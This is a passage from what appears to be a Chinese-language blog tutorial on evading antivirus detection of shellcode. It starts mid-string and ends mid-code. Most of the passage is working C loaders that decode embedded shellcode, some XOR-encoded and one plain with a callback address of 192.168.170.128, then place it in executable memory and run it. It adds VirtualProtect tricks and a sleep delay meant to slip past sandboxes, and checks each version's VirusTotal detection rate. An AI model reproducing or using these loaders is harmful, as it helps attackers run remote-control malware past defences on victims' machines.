x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x30\x2e\x31\x32\x38\x00\x00\x00\x00\x00"</span><span class="token punctuation">;</span>

<span class="token comment">// 获取shellcode大小</span>
shellcode_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/*
VirtualAlloc(
    NULL, // 基址
    800,  // 大小
    MEM_COMMIT, // 内存页状态
    PAGE_EXECUTE_READWRITE // 可读可写可执行
    );
*/</span>

<span class="token keyword">char</span> <span class="token operator">*</span> shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>
    shellcode_size<span class="token punctuation">,</span>
    MEM_COMMIT<span class="token punctuation">,</span>
    PAGE_EXECUTE_READWRITE
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将shellcode复制到可执行的内存页中</span>
<span class="token function">CopyMemory</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
    <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>shellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
    <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 一直等待线程执行结束</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译成功后，运行：<br>
<img src="https://img-blog.csdnimg.cn/20201008165106270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
V站查杀结果：<br>
<img src="https://img-blog.csdnimg.cn/20201008165114806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">00</span>b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0<span class="token operator">/</span>detection
</code></pre>
<p>这个效果已经很好，但是我想要更好。</p>
<p><strong>0x04 实现一次混淆加载</strong></p>
<p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>


<span class="token comment">// 入口函数</span>
<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> shellcode_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// shellcode长度</span>
    DWORD dwThreadId<span class="token punctuation">;</span> <span class="token comment">// 线程ID</span>
    HANDLE hThread<span class="token punctuation">;</span> <span class="token comment">// 线程句柄</span>
<span class="token comment">/* length: 800 bytes */</span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>


<span class="token comment">// 获取shellcode大小</span>
shellcode_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* 增加异或代码 */</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>shellcode_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
VirtualAlloc(
    NULL, // 基址
    800,  // 大小
    MEM_COMMIT, // 内存页状态
    PAGE_EXECUTE_READWRITE // 可读可写可执行
    );
*/</span>

<span class="token keyword">char</span> <span class="token operator">*</span> shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>
    shellcode_size<span class="token punctuation">,</span>
    MEM_COMMIT<span class="token punctuation">,</span>
    PAGE_EXECUTE_READWRITE
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将shellcode复制到可执行的内存页中</span>
<span class="token function">CopyMemory</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
    <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>shellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
    <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 一直等待线程执行结束</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>上线效果：<br>
<img src="https://img-blog.csdnimg.cn/20201008165154182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201008165200183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
V站查杀：</p>
<p><img src="https://img-blog.csdnimg.cn/20201008165311178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span>a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723<span class="token operator">/</span>detection
</code></pre>
<hr>
<h2><a id="919__790"></a>9.1.9 静态恶意代码逃逸（第三课）</h2>
<p><strong>0x01 关于内存申请的优化</strong></p>
<p>前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode
</code></pre>
<p>本章只提及一下关于VirtualAlloc的建议。</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>windows<span class="token operator">/</span>win32<span class="token operator">/</span>api<span class="token operator">/</span>memoryapi<span class="token operator">/</span>nf<span class="token operator">-</span>memoryapi<span class="token operator">-</span>virtualalloc
</code></pre>
<p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token comment">// 入口函数</span>
<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> shellcode_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// shellcode长度</span>
    DWORD dwThreadId<span class="token punctuation">;</span> <span class="token comment">// 线程ID</span>
    HANDLE hThread<span class="token punctuation">;</span> <span class="token comment">// 线程句柄</span>
    DWORD dwOldProtect<span class="token punctuation">;</span> <span class="token comment">// 内存页属性</span>
<span class="token comment">/* length: 800 bytes */</span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>


<span class="token comment">// 获取shellcode大小</span>
shellcode_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* 增加异或代码 */</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>shellcode_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
VirtualAlloc(
    NULL, // 基址
    800,  // 大小
    MEM_COMMIT, // 内存页状态
    PAGE_EXECUTE_READWRITE // 可读可写可执行
    );
*/</span>

<span class="token keyword">char</span> <span class="token operator">*</span> shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>
    shellcode_size<span class="token punctuation">,</span>
    MEM_COMMIT<span class="token punctuation">,</span>
    PAGE_READWRITE <span class="token comment">// 只申请可读可写</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 将shellcode复制到可读可写的内存页中</span>
<span class="token function">CopyMemory</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 这里开始更改它的属性为可执行</span>
<span class="token function">VirtualProtect</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">,</span>PAGE_EXECUTE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span>
<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
    <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>shellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
    <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 一直等待线程执行结束</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008165436390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">0</span>a97372041356176fd3f21fc199f9f4a999e015236cf832e0583e9f0ba1917c3<span class="token operator">/</span>detection
</code></pre>
<p><strong>0x02 异或方式</strong></p>
<p>通常，我们使用循环去进行异或运算，会使用到异或运算符，这里是较为敏感的操作，那么，Windows下是否有相应的API呢？</p>
<p>我在学习《Windows核心编程》的过程中，发现InterlockedXorRelease函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p>
<p>抱着这个心态，我决定实验一下：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;WinBase.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token comment">// 入口函数</span>
<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> shellcode_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// shellcode长度</span>
    DWORD dwThreadId<span class="token punctuation">;</span> <span class="token comment">// 线程ID</span>
    HANDLE hThread<span class="token punctuation">;</span> <span class="token comment">// 线程句柄</span>
    DWORD dwOldProtect<span class="token punctuation">;</span> <span class="token comment">// 内存页属性</span>
<span class="token comment">/* length: 800 bytes */</span>

